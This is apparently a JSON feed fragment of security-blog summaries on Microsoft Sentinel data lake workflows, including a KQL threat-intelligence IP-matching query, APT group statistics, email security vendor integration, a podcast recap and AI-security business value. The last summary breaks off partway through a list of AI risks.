      "summary": "This article is part of The Sentinel data lake Practitioner Series. Part 1 of the series focuses on operationalizing the Sentinel data lake and our strategic vision for the customers. This series is evolving based on inputs and feedback from the community as well as various components of turning raw security data and workflows into operational security engine. Why This Series? Microsoft recently announced Sentinel data lake unlocking massive potential for security teams. Security data lakes are the foundation of modern detection and investigation. This blog series is designed to empower you to fully leverage your Sentinel data lake investment \u2013 providing practical tools, actionable workflows, and analyst-ready templates that simplify querying datalake-tier data and enable SOC teams to turn raw logs into meaningful security insights. With the right guidance, you can maximize the value you get from your Sentinel data lake. Microsoft Security research team has worked extensively on modular Jupyter notebooks, Python-based data analysis, enrichment, and visualization libraries, and security-driven analysis workflows at scale. We believe the key to adoption lies in researcher-driven operationalization \u2014bringing these methods directly to practitioners in ways they can use immediately. Strategic Vision for Operationalization of Sentinel data lake Our approach centers on researcher-led enablement with ready-to-use workflows and customer community activation. The above infographic outlines four building blocks that brings a security data lake to life: Research curated and Community-Powered Content Hub Researcher-curated GitHub repository. Shared notebooks, detection templates, and models. Continuous contributions from the security researchers and community. Notebook & Model Templates Jupyter & VS Code notebooks tailored for analyst use. ML/GenAI models tailored for security data enrichment and anomaly detection. Modular queries for detections and investigations. Historical Data Enablement Analytics to data lake tier automation for cost-efficient historical queries. Dynamic baselining over months/years of logs to tune detections. Unlocking long-tail investigation scenarios otherwise left dormant. Practical real world Use Cases Historical threat hunting on network, identity, and cloud logs. Dynamic detection tuning at scale. GenAI-powered investigations. Post-incident deep dives to uncover the full blast radius. Getting Started Notebook: Building Familiarity with the Data Lake Framework Before diving into advanced workflows, we\u2019ve published a Getting Started Notebook designed to help practitioners quickly onboard to the Sentinel Data Lake environment. This notebook introduces foundational concepts that will be used across subsequent examples and pipelines. What it covers: Connecting to the Data Lake: Learn how to establish authenticated Spark sessions and securely read data from the Sentinel Data Lake workspace. Exploring Data with Apache Spark: A short hands-on tour using PySpark to inspect schema, preview records, and perform lightweight data transformations at scale. Writing Back to the Lake: Understand the pattern of persisting processed or enriched datasets back to data lake tier for reuse in analytic notebooks and downstream detection pipelines via elevating them to analytics tier. Running Modular Pipelines: Step through a simple example of how pipeline jobs ingest raw security logs (e.g., SigninLogs), apply filters and enrichments, and output ready-to-use tables for later detection development. This foundational notebook ensures analysts and engineers are comfortable with the basic Spark + Sentinel data lake interaction model \u2014 the same model used in the advanced operational notebooks (for example, Password Spray Detection or Anomaly Detection workflows) later in this series. Our Commitment This new blog series will serve as a practitioner\u2019s guide for operationalizing security data lakes. In the following weeks, we\u2019ll gradually deliver: Modular Notebook templates to accelerate hunting, baselining, and investigations. End-to-end workflows connecting datalake-tier \u2192 analytics-tier \u2192 Sentinel detections. Enrichment and Gen AI-driven tools to reduce repetitive manual work and investigation friction. Reusable examples and walkthroughs based on real-world high-volume data sources Our goal is to make Sentinel data lake practical for customers by delivering actionable notebooks, workflows, and enablement. Expected Outcomes for Customers By operationalizing the Sentinel data lake in this way, enterprise customers can expect: Reduced Time-to-Value \u2013 Analysts can move from raw logs to actionable detections in days, not months. Improved Detection Quality \u2013 Long-term baselining and historical analysis reduce false positives and increase fidelity in your detections. Operational Efficiency \u2013 Automated enrichment and packaged workflows minimize manual investigation effort. Cost Optimization \u2013 analytics tier -to-data lake tier data workflows avoid expensive, ad-hoc queries and make historical data practical to use. Join the Journey This series is built by practitioners, for practitioners. Alongside blogs, we\u2019ll also share: GitHub repository with reusable notebooks and model templates. Webinars and demos to walk through the workflows. Together, we\u2019ll move beyond storage and make the security data lake truly operational, analyst-friendly, and impactful. Upcoming articles will demonstrate how notebooks and templates can turn research into workflows that are ready for analysts, featuring practical notebook examples available on GitHub. What's next?

      "title": "Dissecting and Understanding APT Threat Group Activity",
      "summary": "APT Groups prioritize Espionage and data theft: Approximately two-thirds of all Trustwave SpiderLabs-tracked APT group activity is motivated by espionage, targeting government, defense, and telecom sectors primarily in the US, Ukraine, and Russia. Top Attacker Nations : China (41%), Iran (12.5%), and Russia are the leading origins for espionage attacks, emphasizing the critical need for robust threat intelligence to track state-sponsored activity. Beyond Detection: Actionable Threat Intelligence : Trustwave SpiderLabs operationalizes threat intelligence by dissecting APT group Tactics, Techniques, and Procedures (TTPs) and converting them into custom detection rules to dramatically reduce attacker dwell time. Government administration, defense, and finance sector organizations are the primary areas Advanced Persistent Threat (APT) groups are targeting, according to the most recent data from the Trustwave SpiderLabs\u2019 Cyber Threat Intelligence (CTI) team. The team found most attacks are launched from China, Russia, and Iran, with the primary targets residing in the US, Ukraine, and, interestingly, Russia. The groups tracked include Lapsus$, ShinyHunters, and Silk Typhoon. Trustwave\u2019s CTI list is not all-inclusive, but it offers a solid overview of the actors involved, where the attacks are launched from, and the nations undergoing the heaviest attack. SpiderLabs aggregates information continuously from a variety of APT databases maintained by the cybersecurity sector, along with internal reports. Let\u2019s start off with a quick reminder on APT groups and then look at what motivating factors are driving APT activity. APT Defined An Advanced Persistent Threat (APT) is a type of prolonged, targeted cyberattack in which an intruder gains unauthorized access to a network and remains undetected for an extended period, sometimes even months or years. APT groups often use sophisticated toolsets and techniques, such as custom-developed malware, zero-day exploits, and multiple methods to evade traditional security defenses and gain access. Persistence is maintained, as these attackers are not looking for a quick smash-and-grab strike but want long-term access to the network to continuously monitor activity and steal data over a sustained period. They will re-attempt access if initially blocked. APT Group\u2019s Motivating Factors Information Theft and Espionage \u2013 This activity accounts for about two-thirds of all SpiderLabs-tracked APT activity. Our analysts noted that China is responsible for about 41% of these attacks, followed by Iran, conducting 12.5%, and Russia, with 5%. These attacks focused on targets within the US, with Ukraine second most targeted, followed by the British Indian Ocean Territory and Russia. The targets most often hit were government/administration, defense, and telecoms. Financial \u2013 This category covers attackers looking for straight-up financial gain and those attempting crimes against financial institutions. This could include data theft, ransomware, etc. Again, the US was the most targeted nation, followed by Ukraine and Canada. SpiderLabs' insight into which nations housed the attackers is not as clear, with almost half not being known, but of those that are known, Russia is the leader, followed by China. Sabotage and Destruction \u2013 This James Bond-sounding category was the least likely to take place, with instances comprising less than 5% of all attacks. Russia led the way, conducting the most attacks, followed by Iran, striking with the US, Ukraine, Germany, and Israel being the most frequently struck. The most popular targets were the energy, government, defense, and finance sectors. Victimology SpiderLabs has also determined which specific vertical sectors are most often targeted. The government sector, attacked primarily by China-based threat actors, was hit most often, with defense, finance, education, energy, and healthcare all on the receiving end of APT group activity. China, Iran, and Russia were often the home bases for those attacking these groups. SpiderLabs' Direct Role in APT Defense SpiderLabs not only tracks threats but also serves as the instrumental tool that helps Trustwave, A LevelBlue Company, protect its clients, including by defending against APT threats. The information derived for this report is based on the work SpiderLabs does in the field with our clients. The protection offered by Trustwave against APTs is critically dependent on the continuous work of SpiderLabs, which operates across three key areas: 1. Elite Threat Intelligence & TTP Tracking SpiderLabs analysts are dedicated to tracking and analyzing dozens of specific, sophisticated APT groups worldwide (e.g., APT34, APT44/Sandworm, Salt Typhoon, Silver Fox, and Scattered Spider). Dissection of TTPs : The team performs deep analysis on the Tactics, Techniques, and Procedures (TTPs), custom malware, and infrastructure used by these groups. Actionable Intelligence : This proprietary intelligence is immediately converted into custom detection rules and playbooks. These are infused directly into the Trustwave Fusion platform and the client's security tools (e.g., EDR/XDR/SIEM), enabling Trustwave's Security Operations Centers (SOCs) to detect subtle, behavioral anomalies that signature-based tools would miss. 2. Human-Led Advanced Threat Hunting While automated security tools rely on known indicators, APTs specialize in stealth and avoiding detection (known as low-and-slow attacks). SpiderLabs' human expertise is used to find these hidden threats. Hypothesis-Driven Hunts : SpiderLabs experts use a hypothesis-based approach (assuming the client is already breached) to proactively search for indicators of compromise that align with known APT TTPs. MITRE ATT&CK Mapping : Their hunting methodology is mapped to the MITRE ATT&CK framework, allowing them to systematically search for activity across the entire attack chain\u2014from initial access to persistence and command-and-control. Reduced Dwell Time : This proactive hunting significantly reduces the attacker's dwell time (the period an attacker remains in a network undetected,) minimizing the damage an APT can inflict. 3. Incident Response and Preparation If an APT successfully breaches a client, SpiderLabs' forensic and response capabilities are activated immediately. Digital Forensics & Incident Response (DFIR) : The team provides 24/7 global support for emergency breach response, performing forensic investigations to determine the scope, root cause, and identity of the APT actor. Containment and Eradication : They rapidly execute the steps needed to contain the threat and ensure the APT is completely eradicated from the environment. Offensive Security : SpiderLabs' ethical hackers also perform penetration testing and red team exercises that are informed by real-world APT TTPs. This tests a client's defenses against the most advanced adversaries, identifying security gaps before an actual APT exploits them. SpiderLabs ensures that clients are not just protected against general threats, but are specifically fortified against the evolving, state-sponsored, and financially motivated groups that pose the greatest risk.",

      "title": "Ensure your ICES solution works seamlessly alongside Microsoft Defender",
      "summary": "In today\u2019s evolving threat landscape, organizations increasingly rely on layered email security solutions to protect users and sensitive data. Microsoft supports and collaborates with Integrated Cloud Email Security (ICES) vendors that work in conjunction with Microsoft Defender, and customers who choose a layered approach to email security to ensure the maximum level of email protection. It is, however, key that when integrating ICES solutions with Microsoft Defender, to follow best practices to maximize security and operational efficiency. In this blog, we explain these best practices in more detail and outline three other routing techniques commonly used across ICES vendors. This will allow organizations to understand the impact of non-standard mail routing configurations on their security operations (SOC) effectiveness and partner with their ICES vendors on the best approach. Best practices for ICES vendor integration Microsoft has outlined best practices for third-party solutions integrating with Microsoft 365, where recommended and supported approaches include DNS mail routing or the Graph API. This article provides more details on these approaches and also outlines integration techniques that we do not recommend. By using these best practices, any 3 rd party email security vendor can ensure that their solution works seamlessly alongside Microsoft Defender. In addition, we recently launched the Microsoft Defender ICES vendor ecosystem . This gives partners an additional option for integration, where we partner directly with the solution provider to build a deeper integration between the ICES solution and Microsoft Defender. We harmonize telemetry, email verdicts, security policies, and more, to provide joint customers with optimized protection and SOC workflows in the Defender portal. Non-standard email routing techniques used by ICES vendors We know that as the ICES space evolved, several vendors integrated with Microsoft Exchange using non-standard email routing techniques, such as journaling, connector-based routing, and post-delivery actions. These functions were originally designed for different purposes. When deployed alongside Microsoft Defender, these integration approaches can introduce unique complexities for mail flow and SOC operations. Understanding how these techniques work and their potential impact is essential for making informed decisions about your organization\u2019s email security architecture and are outlined below. Journaling for email security benchmarking Email journaling (Figure 1) is a legacy Exchange Online feature originally designed for archiving and to help organizations meet legal, regulatory, and organizational compliance requirements by recording inbound and outbound email communications. While journaling was designed for archiving and similar use cases, we know that various ICES vendors utilize journaling rules to route emails to the vendor\u2019s test environment to evaluate the effectiveness of their solution. Journaling occurs before Defender filtering, so both solutions act independently and partially, complicating operational clarity for SOC teams. This approach can lead to duplicate catch scenarios , therefore misstating the unique catch rate of the ICES vendor . If a journaled copy of a phishing email is routed to an ICES vendor, this occurs before it was filtered by Microsoft Defender . Consequently, both Microsoft Defender and the ICES vendor now simultaneously assess the message, and both solutions may act on it independently. This often results in duplicate catch scenarios and creates ambiguity around which solution blocked the threat, ultimately making it challenging to assess the true effectiveness of each layer. Some ICES vendors may consider every email they filter \u201ca miss by Microsoft Defender\u201d. However, as journaling occurs before Defender filtering, it\u2019s generally an incomplete representation. Therefore, we do not recommend the implementation of journaling for benchmarking or operational clarity purposes of ICES vendor solutions that operate next to Microsoft Defender. Journaling + post-delivery actions Some vendors combine journaling with post-delivery actions via Graph API or Exchange Web Services (EWS). This approach enables them to take remediation actions on emails after they have been delivered to users\u2019 mailboxes, such as moving messages to the Junk folder or adding labels to alert users of potential threats. However, if Defender quarantines a message first, the ICES vendor may not be able to perform these actions, limiting their impact. Furthermore, when a vendor deletes and recreates a message using EWS, it can result in duplicate message IDs, which fragments SOC visibility and slows incident response. As a result, these configurations should be avoided, as they can lead to unreliable investigations and operational complexity. Connector-based implementations Connectors are typically used to route mail between Exchange Online and on-premises or non-Microsoft systems. Some vendors repurpose this mechanism to: Route messages out of Exchange Online after Microsoft Defender filtering. Apply their own filtering. Reinject the message as a new email. Using connectors to send messages out of Exchange Online after Microsoft Defender filtering, apply additional vendor filtering, and then return them as new emails introduces major operational risks. Reinjecting messages strips the original sender authentication context (SPF, DKIM, DMARC), which can lead to false positives, duplicate quarantines, and inconsistent reporting across tools like Explorer, Advanced Hunting, and Message Trace in Microsoft Defender. With this configuration, SOC teams may see multiple message IDs for the same email, making it difficult to correlate events and accurately track message disposition. This also impacts post-delivery protections such as Zero-hour Auto Purge , which may fail or be misapplied. These issues increase investigation time, reduce visibility, and can undermine existing protections, impacting the overall security of an organization. That\u2019s why our documentation states that we strongly recommend avoiding this configuration. When assessing statistics or performance claims about Microsoft Defender\u2019s effectiveness, it\u2019s important to keep in mind how deployment configurations can shape outcomes. As outlined above, techniques such as journaling, connector-based routing, and post-delivery actions may introduce complexities that affect how performance is measured. These integration approaches can result in discrepancies within metrics, making it challenging to accurately attribute detections or gauge overall effectiveness. It is essential for security leaders and SOC teams to interpret results and make informed decisions about your organization\u2019s email security posture. Microsoft\u2019s commitment to effective ICES vendor integration By understanding the impact of the various integration techniques, security leaders can ensure their layered email security delivers streamlined SOC workflows and the highest level of protection for email. Microsoft is committed to working collaboratively with all ICES vendors to help them embrace best practices in integrating with Microsoft Exchange so they can work effectively alongside Microsoft Defender. Whether using the documented best practices with Microsoft Exchange or joining the Defender ecosystem to build an even deeper integration, either approach will help ensure that the solutions work seamlessly alongside Microsoft Defender.

      "title": "250 Episodes of Cloud Security Podcast by Google: From Confidential Computing to AI-Ready SOC",
      "summary": "Gemini for Docs improvises So this may suck, but I am hoping to at least earn some points for honesty here. I wanted to write something pithy and smart once I realized our Cloud Security Podcast by Google just aired our 250th episode ( \u201cEP250 The End of \u201cCollect Everything\u201d? Moving from Centralization to Data Access?\u201d ). Yet nothing sufficiently pithy came to my mind \u2026 \u2026 so I went around and asked a whole bunch of AIs and agents and such. Then massaged and aggregated the outputs, then ran more AI on the result. And then lightly curated it. Then deleted the bottom 2 stupidest points they made. So, here it comes \u2026 in all its sloppy glory! The Foundational Roots and Unchanging Mission: Our show started with foundational cloud security topics \u2014 like Zero Trust, Data Security, and Cloud Migration Security which drew the initial large audiences. The core commitment since Episode 1 has been to question conventional wisdom, avoid \u201csecurity theater\u201d ( EP248 ) and explore whether security measures truly benefit the user and the organization. The AI Transformation: We had a sizable shift with the last 50 episodes, where AI became a central theme , or at least one of the themes we always come back to (and, yes, this covers our 3 pillars of securing AI, AI for security and countering the AI-armed attacker). The focus has moved past general hype to practical applications, securing AI systems, and asking challenging questions like \u201cData readiness for AI SOC\u201d ( EP249 ). The Enduring Popularity of Detection & Response (D&R): We highlight that D&R and modernizing the SOC continue to be extremely popular with the audience ( EP236 is epic ). Trace the evolution of this topic from foundational engineering (like the very popular EP75 on scaling D&R at Google ) to the architectural questions in EP250 . \u201cHow Google Does Security\u201d Sells the Tickets : We love the episodes offering a candid look behind Google\u2019s security curtain on topics like internal red teaming, detection scaling, and Cloud IR tabletops. They consistently remain perennial audience favorites (the latest in this series is EP238 on how we use AI agents for security). The Centrality of People and Process: We emphasize the recurring lessons that the most challenging aspects of large-scale cloud (and now AI) security transformations are often the \u201cpeople\u201d and \u201cprocess\u201d elements, not the technical \u201ctech\u201d itself. EP237 is an epic example of this. The Call for Intentionality: We reinforce the importance of having a clear purpose for every security activity and following an engineering-led approach ( EP117 ). The \u201cmagical\u201d advice from EP236 is: to ask of every security element, \u201cwhat is it in service of?\u201d The Persistence of Old Problems: We often lament with a touch of humor on the industry\u2019s tendency to repeat fundamental security mistakes (the SIEM Paradox in EP234 for instance or EP223 in general), underscoring the ongoing need to cover \u201cboring\u201d basics. We will absolutely continue this (a new episode on vulnerability management \u201cstale\u201d problems is coming soon) Community and Format Growth: We continue to \u201csorta-kinda\u201d (human wrote this, eh?) the development of the podcast beyond a purely audio medium , including the launch of live video sessions and a Community site to foster more dialogue and feedback. The Unique Culture and Authenticity of the Show Stays : We remain obsessed about selecting high-energy, vocal, and knowledgeable guests and fun topics. We will keep on with our \u201cinside jokes\u201d like not allowing guests to recommend Anton\u2019s blog as an episode resource and pokes about firewall appliances in the cloud (they are there ). A Glimpse at 300: We want to tease future topics that will define the next 50+ episodes, such as deeper dives into Agentic AI, challenges of cross-cloud incident response and forensics, or the geopolitical aspects of cloud security. Give us ideas, will ya?

      "title": "Automating IOC hunts in Microsoft Sentinel data lake",
      "summary": "Security operations are undergoing significant transformation driven by the introduction of AI and a rapidly evolving threat landscape. With Microsoft Sentinel data lake now generally available , organizations can centralize all their security data in a purpose-built security data lake. This helps optimize costs, simplify data management, and accelerate the adoption of AI in security operations. This empowers defenders to transcend legacy security controls, adopting advanced analytics and automation for more dynamic and effective protection. A key advantage of the Sentinel data lake is its cost-efficiency, making it ideal for ingesting and retaining large volumes of security logs, such as network logs, without incurring high expenses or compromising coverage. By storing all security data in a unified, cost-effective data lake, organizations gain comprehensive, long-term visibility for historical threat hunting and TI matching, enabling investigations across extended timelines without the prohibitive costs of traditional analytics solutions. In this blog we will explore how security teams can leverage KQL jobs in Sentinel data lake to automate threat hunting and threat intelligence matching across network logs, enabling scalable, cost-effective, and continuous threat detection. By doing so, SOCs can efficiently process large volumes of data and transform raw logs into actionable insights efficiently with minimal manual intervention. What are KQL jobs? KQL jobs in Sentinel data lake are automated one-time or scheduled jobs that run Kusto Query Language (KQL) queries on data lake. These jobs help security teams investigate and hunt for threats more easily by automating processes like checking logs against known threat data. By automating tasks such as IOC matching with historical or high-volume data, analysts are able to concentrate on higher-value activities. This results in more effective threat detection and response. The next section demonstrates how to use the data lake for Threat Intelligence (TI) matching across network logs. IOC matching on network log on data lake Network logs, such as firewall and proxy data, are essential for uncovering advanced threats and supporting investigations. However, storing all this data in the analytics tier is often expensive, leading to reduced retention and potential blind spots. With Sentinel data lake, SOCs can store all their raw telemetry, at a fraction of the cost, making it possible to hunt for threats across a much broader timeline without financial constraints. However, simply storing data isn\u2019t enough. To turn raw logs into actionable insights, SOC teams need to automate both summarization and threat intelligence (TI) matching. Scheduled KQL jobs make this possible by scanning new data in a schedule as it arrives in the data lake, surfacing suspicious activity for analyst review. Schedule KQL job for TI matching on network logs Here\u2019s a practical example of how a SOC can use a scheduled KQL job to summarize network activity and correlate it with threat intelligence indicators. In this scenario, a KQL job is run to identify network log entries from Palo Alto firewalls that match known malicious IPs from ThreatIntelIndicators table. The output provides the complete network log row, enriched with relevant threat intelligence fields for further investigation and response. Create your query: let IPRegex = '[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}'; let dt_lookBack = 75m; // Look back 1 hour for CommonSecurityLog events let ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators // Fetch threat intelligence indicators related to IP addresses let IP_Indicators = ThreatIntelIndicators //extract key part of kv pair | extend IndicatorType = replace(@\"\\[|\\]|\\\"\"\", \"\", tostring(split(ObservableKey, \":\", 0))) | where IndicatorType in (\"ipv4-addr\", \"ipv6-addr\", \"network-traffic\") | extend NetworkSourceIP = toupper(ObservableValue) | extend TrafficLightProtocolLevel = tostring(parse_json(AdditionalFields).TLPLevel) | where TimeGenerated >= ago(ioc_lookBack) | extend TI_ipEntity = iff(isnotempty(NetworkSourceIP), NetworkSourceIP, NetworkSourceIP) | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkSourceIP), NetworkSourceIP, TI_ipEntity) | where ipv4_is_private(TI_ipEntity) == false and TI_ipEntity !startswith \"fe80\" and TI_ipEntity !startswith \"::\" and TI_ipEntity !startswith \"127.\" | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by Id, ObservableValue | where IsActive and (ValidUntil > now() or isempty(ValidUntil)); // Perform a join between IP indicators and CommonSecurityLog events IP_Indicators | project-reorder *, Tags, TrafficLightProtocolLevel, NetworkSourceIP, TI_ipEntity // Use innerunique to keep performance fast and result set low, as we only need one match to indicate potential malicious activity that needs investigation | join kind=innerunique ( CommonSecurityLog | where TimeGenerated >= ago(dt_lookBack) | extend MessageIP = extract(IPRegex, 0, Message) | extend CS_ipEntity = iff((not(ipv4_is_private(SourceIP)) and isnotempty(SourceIP)), SourceIP, DestinationIP) | extend CS_ipEntity = iff(isempty(CS_ipEntity) and isnotempty(MessageIP), MessageIP, CS_ipEntity) | extend CommonSecurityLog_TimeGenerated = TimeGenerated ) on $left.TI_ipEntity == $right.CS_ipEntity // Filter out logs that occurred after the expiration of the corresponding indicator | where CommonSecurityLog_TimeGenerated Source: Microsoft Sentinel GitHub repo Before submitting a KQL job you may want to test your query interactively, using the KQL queries page: Create a KQL job: To match against new logs periodically, we would like to schedule this job to run every hour to summarize network log and match against latest IOCs in ThreatInelIndicators. To avoid missing any logs, I suggest adding an overlap between lookback and schedules, to make sure all logs are scanned. For example, you can set lookback of the last 75 minutes and execute job runs every 60 minutes. KQL jobs can run ad-hoc or be scheduled based on your preferred frequency (by minutes, hourly, daily, weekly or monthly), automatically summarizing new network activity and highlighting matches with known malicious indicators. Analysts can then focus on the most relevant events, accelerating investigations and reducing noise. Results are automatically available in the analytics tier and can be used to set up an automated detection using Analytics rules. The cost of running KQL jobs in Sentinel data lake depends on the volume of data scanned and how frequently the jobs run. Data lake KQL queries and jobs are priced at $0.005 per GB scanned. For example, if a KQL job scans 1 TB of data daily, the monthly cost would be around $150 USD. This pricing model allows organizations to perform large-scale threat hunting and intelligence matching without the high expenses typically associated with traditional SIEMs. $0.005 per GB scanned . For more details around Microsoft Sentinel data lake costs for KQL queries and jobs, see https://azure.microsoft.com/en-us/pricing/calculator . Summary and next steps Threat hunting at scale within Sentinel data lake is simplified with KQL jobs. SOC teams can use this method for various hunting or anomaly detection scenarios such as efficiently aggregating and correlating network logs with threat intelligence, enhancing visibility, agility, and assurance, and transforming raw telemetry into actionable security insights. KQL jobs provide several benefits: Continuous threat coverage: Scheduled jobs utilizing KQL automatically correlate high-volume logs located directly in the data lake with up-to-date threat intelligence. This process helps minimize detection gaps and blind spots. Efficient use of resources: Automating TI matching saves analysts from repetitive queries, allowing them to focus on investigating validated alerts rather than sifting through raw logs. Faster response times: Suspicious connections flagged by minutes or every hour enable quicker triage and containment before threats escalate. Historical context: Matches are retained against long-term or high volume logs, enabling analysts to trace back patterns of malicious activity and support deeper investigations.

      "title": "Unlocking Developer Innovation with Microsoft Sentinel data lake",
      "summary": "Introduction Microsoft Sentinel is evolving rapidly, transforming to be both an industry-leading SIEM and an AI-ready platform that empowers agentic defense across the security ecosystem. In our recent webinar: Introduction to Sentinel data lake for Developers , we explored how developers can leverage Sentinel\u2019s unified data lake, extensible architecture, and integrated tools to build innovative security solutions. This post summarizes the key takeaways and actionable insights for developers looking to harness the full power of Sentinel. Figure 1: Microsoft Sentinel journey The Sentinel Platform: A Foundation for Agentic Security Unified Data and Context Sentinel centralizes security data cost-effectively, supporting massive volumes and diverse data types. This unified approach enables advanced analytics, graph-enabled context, and AI-ready data access\u2014all essential for modern security operations. Developers can visualize relationships across assets, activities, and threats, mapping incidents and hunting scenarios with unprecedented clarity. Extensible and Open Platform Sentinel\u2019s open architecture simplifies onboarding and data integration. Out-of-the-box connectors and codeless connector creation make it easy to bring in third-party data. Developers can quickly package and publish agents that leverage the centralized data lake and MCP server, distributing solutions through Microsoft Security Store for maximum reach. The Microsoft Security Store is a storefront for security professionals to discover, buy, and deploy vetted security SaaS solutions and AI agents from our ecosystem partners. These offerings integrate natively with Microsoft Security products\u2014including the Sentinel platform, Defender, and Entra, to deliver end\u2011to\u2011end protection. By combining curated, deploy\u2011ready solutions with intelligent, AI\u2011assisted workflows, the Store reduces integration friction and speeds time\u2011to\u2011value for critical tasks like triage, threat hunting, and access management. Figure 2: Microsoft Sentinel product breakdown Advanced Analytics and AI Integration With support for KQL, Spark, and ML tools, Sentinel separates storage and compute, enabling scalable analytics and semantic search. Jupyter Notebooks hosted in on-demand Spark environments allow for rich data engineering and machine learning directly on the data lake. Security Copilot agents, seamlessly integrated with Sentinel, deliver autonomous and adaptive automation, enhancing both security and IT operations. Figure 3: Microsoft Security partner ecosystem Developer Scenarios: Unlocking New Possibilities The webinar showcased several developer scenarios enabled by Sentinel\u2019s platform components: Threat Investigations Over Extended Timelines: Query historical data to uncover slow-moving attacks and persistent threats. Behavioral Baselining: Model normal behavior using months of sign-in logs to detect anomalies. Alert Enrichment: Correlate alerts with firewall and NetFlow data to improve accuracy and reduce false positives. Retrospective Threat Hunting: React to new indicators of compromise by running historical queries across the data lake. ML-Powered Insights: Build machine learning models for anomaly detection, alert enrichment, and predictive analytics. These scenarios demonstrate how developers can leverage Sentinel\u2019s data lake, graph capabilities, and integrated analytics to deliver powerful security solutions. End-to-End Developer Journey The following steps outline a potential workflow for developers to ingest and analyze their data within the Sentinel platform. Figure 4: End-to-end developer journey Data Sources: Identify high-value data sources from your environment to integrate with Microsoft Security data. The journey begins with your unique view of the customer\u2019s digital estate. This is data you have in your platform today. Bringing this data into Sentinel helps customers make sense of their entire security landscape at once. Data Ingestion: Import third-party data into the Sentinel data lake for secure, scalable analytics. As customer data flows from various platforms into Sentinel, it is centralized and normalized, providing a unified foundation for advanced analysis and threat detection across the customer\u2019s digital environment. Sentinel data lake and Graph: Run Jupyter Notebook jobs for deep insights, combining contributed and first-party data. Once data resides in the Sentinel data lake, developers can leverage its graph capabilities to model relationships and uncover patterns, empowering customers with comprehensive insights into security events and trends. Agent Creation: Build Security Copilot agents that interact with Sentinel data using natural language prompts. These agents make the customer\u2019s ingested data actionable, allowing users to ask questions or automate tasks, and helping teams quickly respond to threats or investigate incidents using their own enterprise data. Solution Packaging: Package and distribute solutions via the Microsoft Security Store, reaching customers at scale. By packaging these solutions, developers enable customers to seamlessly deploy advanced analytics and automation tools that harness their data journey\u2014 from ingestion to actionable insights\u2014across their entire security estate. Conclusion Microsoft Sentinel\u2019s data lake and platform capabilities open new horizons for developers. By centralizing data, enabling advanced analytics, and providing extensible tools, Sentinel empowers you to build solutions that address today\u2019s security challenges and anticipate tomorrow\u2019s threats.

      "title": "Unlocking Business Value: Microsoft's Dual Approach to AI for Security and Security for AI",
      "summary": "Overview In an era where cyber threats evolve at an unprecedented pace and artificial intelligence (AI) transforms business operations, Microsoft stands at the forefront with a comprehensive strategy that addresses both leveraging AI to bolster security and safeguarding AI systems themselves. This white paper, presented in blog post format, explores Microsoft's business value model for \"AI for Security\" \u2013 using AI to enhance threat detection, response, and prevention \u2013 and \"Security for AI\" \u2013 protecting AI deployments from emerging risks. Drawing from independent studies, real-world case studies, and economic analyses, we demonstrate how these approaches deliver tangible returns on investment (ROI) and total economic impact (TEI). Whether you're a CISO evaluating security investments or a business leader integrating AI, this post provides insights, visuals, and calculations to guide your strategy. Executive Summary The enterprise adoption of AI has transcended from a technological novelty to a strategic imperative, fundamentally altering competitive landscapes and business models. Organizations that fail to integrate AI risk operational inefficiency, diminished competitiveness, and missed revenue opportunities. However, the path from initial awareness to full-scale transformation is fraught with a new and complex class of security risks that traditional cybersecurity postures are ill-equipped to address. This report provides a comprehensive analysis of the enterprise AI adoption journey, the evolving threat landscape, and a data-driven financial case for securing AI initiatives exclusively through Microsoft's unified security ecosystem. The AI journey is a multi-stage process, beginning with Awareness and Experimentation before progressing to Operational deployment, Systemic integration, and ultimately, Transformational impact. Advancement through these stages is contingent not on technology alone, but on a clear executive vision, a structured roadmap that aligns AI potential with business reality, and a foundational commitment to responsible AI governance. This journey is paralleled by the emergence of a sophisticated AI threat landscape. Malicious actors are no longer targeting just infrastructure but the very logic and integrity of AI models. Threats such as data poisoning, model theft, prompt injection, risks to intellectual property, data privacy, regulatory compliance, and brand reputation. Furthermore, the proliferation of generative AI tools creates a novel \"accidental insider\" risk, where well-intentioned employees can inadvertently leak sensitive corporate data to third-party models. To counter these multifaceted threats, a fragmented, multi-vendor security approach is proving insufficient. Microsoft offers a cohesive, AI-native security platform that provides end-to-end protection across the entire AI lifecycle. This unified framework integrates Microsoft Purview for proactive data security and governance, Microsoft Sentinel for AI-powered threat detection and response, and Microsoft Defender alongside Azure AI Services for comprehensive endpoint, application, infrastructure protection and Microsoft Entra for securing and protecting the identity and access management control. The platform's strength lies in its deep, native integration, which creates a virtuous cycle of shared intelligence and automated response that siloed solutions cannot replicate. A rigorous market analysis, based on independent studies from Forrester and IDC, demonstrates that investing in this unified security framework is not a cost center but a significant value driver. The financial returns are compelling: Microsoft Purview delivers a 355% Return on Investment (ROI) over three years, driven by a 30% reduction in data breach likelihood and a 75% improvement in security investigation time. For more details: mccs-ms-purview-final-9-3.pdf Microsoft Sentinel generates a 234% ROI , reducing the Total Cost of Ownership (TCO) from legacy Security Information and Event Management (SIEM) solutions by 44% and cutting false positives by up to 79%.

By establishing a secure and trusted data environment, organizations can confidently accelerate their adoption of transformative AI technologies, unlocking the broader business value and competitive advantage that AI promises. This report concludes with a clear strategic recommendation: to successfully navigate the AI frontier, executive leadership must prioritize investment in a unified, AI-native security and governance framework as a foundational enabler of their digital transformation strategy. AI Risks/Challenges AI is transforming cybersecurity, but it also might introduce new vulnerabilities and attack surfaces . Organizations adopting AI must address risks such as data leakage, prompt injection attacks, model poisoning, identity and access management, and compliance gaps. These threats are not hypothetical\u2014they are already impacting enterprises globally. Key Risks and Their Impact Data Security & Privacy 80%+ of security leaders cite leakage of sensitive data as their top concern when adopting AI.

